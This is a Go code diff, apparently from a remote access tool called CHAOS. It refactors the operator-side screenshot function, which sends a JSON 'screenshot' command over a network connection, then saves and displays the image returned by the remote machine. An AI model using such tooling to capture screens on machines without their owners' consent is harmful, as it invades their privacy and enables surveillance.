@@ -1,15 +1,18 @@
 package screenshot
 
 import (
+	"encoding/json"
 	"fmt"
 	"github.com/google/uuid"
 	log "github.com/sirupsen/logrus"
+	"github.com/tiagorlampert/CHAOS/internal/models"
 	"github.com/tiagorlampert/CHAOS/internal/usecase"
 	"github.com/tiagorlampert/CHAOS/internal/util/network"
 	"github.com/tiagorlampert/CHAOS/pkg/color"
 	"github.com/tiagorlampert/CHAOS/pkg/system"
 	"github.com/tiagorlampert/CHAOS/pkg/util"
 	"net"
+	"os"
 )
 
 type ScreenshotUseCase struct {
@@ -24,19 +27,28 @@ func NewScreenshotUseCase(conn net.Conn) usecase.Screenshot {
 
 func (s ScreenshotUseCase) TakeScreenshot(input string) {
 	fmt.Println(color.Green, "[*] Getting Screenshot...")
-	err := network.Send(s.Connection, []byte(input))
+
+	request, err := json.Marshal(models.Request{
+		Runnable: false,
+		Command:  "screenshot",
+	})
+	if err != nil {
+		log.Error(err)
+	}
+
+	err = network.Send(s.Connection, request)
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error sending request")
 		return
 	}
 
-	data, err := network.Read(s.Connection)
+	response, err := network.Read(s.Connection)
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error reading screenshot")
 		return
 	}
 
-	if err := saveScreenshot(data); err != nil {
+	if err := saveScreenshot(response); err != nil {
 		log.WithField("cause", err.Error()).Error("error saving screenshot")
 	}
 }
@@ -44,12 +56,12 @@ func (s ScreenshotUseCase) TakeScreenshot(input string) {
 func saveScreenshot(response []byte) error {
 	util.CreateDirectory(util.TempDirectory)
 
-	filename := fmt.Sprint(util.TempDirectory, uuid.New().String(), ".png")
+	filename := fmt.Sprint(util.TempDirectory, string(os.PathSeparator), uuid.New().String(), ".png")
 	if err := util.WriteFile(filename, response); err != nil {
 		return err
 	}
 
-	fmt.Println(color.Green, "[*] File saved at", filename)
+	fmt.Println(color.Green, "[*] ReceiveFile saved at", filename)
 	system.RunCmd(fmt.Sprintf("eog %s", filename), 5)
 	return nil
 }
